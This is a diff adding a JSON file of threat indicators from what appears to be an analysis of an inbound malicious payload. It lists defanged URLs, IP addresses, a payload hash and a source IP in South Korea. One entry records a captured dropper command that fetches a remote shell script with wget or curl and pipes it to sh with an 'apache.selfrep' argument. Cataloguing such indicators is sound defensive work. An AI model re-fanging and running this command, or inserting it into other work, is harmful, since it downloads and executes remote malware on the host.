@@ -1,0 +1,39 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://14[.]46[.]136[.]XXX/sh)"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://14[.]46[.]136[.]XXX/sh"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "14[.]46[.]136.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget --no-check-certificate -qO- hxxps://14[.]46[.]136[.]XXX/sh || curl -sk hxxps://14[.]46[.]136[.]XXX/sh) | sh -s apache.selfrep"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2"
+  },
+  {
+    "asn": "Korea Telecom",
+    "country": "South Korea",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "211[.]62[.]61.XXX"
+  }
+]
